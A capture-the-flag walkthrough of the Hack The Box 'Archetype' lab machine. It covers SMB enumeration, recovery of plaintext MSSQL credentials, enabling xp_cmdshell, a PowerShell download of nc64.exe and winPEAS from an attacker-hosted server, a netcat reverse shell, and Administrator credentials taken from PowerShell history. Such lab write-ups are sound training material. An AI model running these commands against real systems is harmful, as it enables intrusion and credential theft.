# Archetype (HTB) Walkthrough

### 1. Reconnaissance

An initial full TCP port scan was performed against the target system to identify all exposed network services.

    nmap -sS -sV -Pn -p- <target-ip>

**Scan Options Explanation**

-sS performs a TCP SYN scan to identify open ports

-sV enables service and version detection

-Pn disables host discovery and assumes the host is online

-p- scans all 65535 TCP ports

**Results**
The scan revealed the following open TCP ports:

445 – SMB

1433 – MSSQL

These services indicated a Windows-based target with file sharing and database services exposed.

### 2. SMB Enumeration
Port 445 was identified as an SMB service. Enumeration was performed to identify accessible shares.

    smbclient -L //<target-ip> -N

Anonymous access was allowed, and a backup/configuration share was discovered. The share contents were listed and downloaded locally for analysis.

    smbclient //<target-ip>/backups -N

### 3. Credential Discovery
Within the SMB share, a configuration file was identified. Reviewing the file revealed plaintext MSSQL credentials.

Discovered Credentials

    Username: sql_svc
    Password: Retrieved from configuration file

This indicated poor credential storage practices and immediate access to the database service.

### 4. MSSQL Authentication
Using the discovered credentials, authentication to the MSSQL server was attempted using Impacket’s mssqlclient.py.

    python3 mssqlclient.py ARCHETYPE/sql_svc@<target-ip> -windows-auth

Authentication was successful, confirming valid database access using Windows authentication.

### 5. Privilege Verification
Once authenticated, the role of the user was checked to determine privilege level.

    SELECT is_srvrolemember('sysadmin');

The result returned 1, indicating that the user was a sysadmin on the SQL Server. This level of access allows server-wide configuration changes.

### 6. Enabling Command Execution (xp_cmdshell)
The xp_cmdshell stored procedure was found to be disabled by default. Since the user had sysadmin privileges, it was enabled.

    EXEC sp_configure 'show advanced options', 1;
    RECONFIGURE;
    EXEC sp_configure 'xp_cmdshell', 1;
    RECONFIGURE;

Once enabled, system commands could be executed directly through SQL queries.

### 7. Command Execution via MSSQL
Command execution was verified by running a basic system command.

    EXEC xp_cmdshell 'whoami';

The output showed execution as the ARCHETYPE\sql_svc service account, confirming OS-level command execution.

### 8. Reverse Shell Setup
To obtain an interactive shell, a reverse shell approach was used.

On the Attacker Machine
A Netcat listener was started:

    nc -nlvp 443

A simple HTTP server was also started to host payloads:


    python3 -m http.server 80

### 9. Payload Delivery
Using xp_cmdshell with PowerShell, a Netcat binary (nc64.exe) was downloaded to a writable directory on the target.

    xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; Invoke-WebRequest http://<attacker-ip>/nc64.exe -OutFile nc64.exe"

This confirmed successful file transfer from the attacker system to the target.

### 10. Reverse Shell Execution
The downloaded binary was executed to initiate a reverse shell connection back to the attacker.

     xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe <attacker-ip> 443"

A reverse shell connection was received, granting interactive command access to the system.

### 11. Post-Exploitation Enumeration
With shell access established, further enumeration was performed to identify privilege escalation paths.

The privilege enumeration tool winPEAS was uploaded using the same HTTP transfer technique.

    EXEC xp_cmdshell "powershell -c Invoke-WebRequest http://<attacker-ip>/winPEASx64.exe -OutFile C:\Users\sql_svc\Downloads\winPEASx64.exe"

### 12. Privilege Escalation Discovery
Execution of winPEAS revealed accessible PowerShell command history files.

    C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

Reviewing this file revealed plaintext Administrator credentials from previously executed commands.

### 13. Administrative Access
Using the recovered Administrator credentials, authentication as Administrator was achieved via remote execution tools.

This resulted in full system compromise and access to the Administrator flag.

### 14. Exploitation Outcome
The Archetype system was fully compromised through:

 - Exposed SMB share with sensitive configuration files
   
  - Plaintext MSSQL credentials
   
  - Excessive SQL Server privileges
   
  - Abuse of xp_cmdshell
   
  - Poor credential hygiene enabling privilege escalation
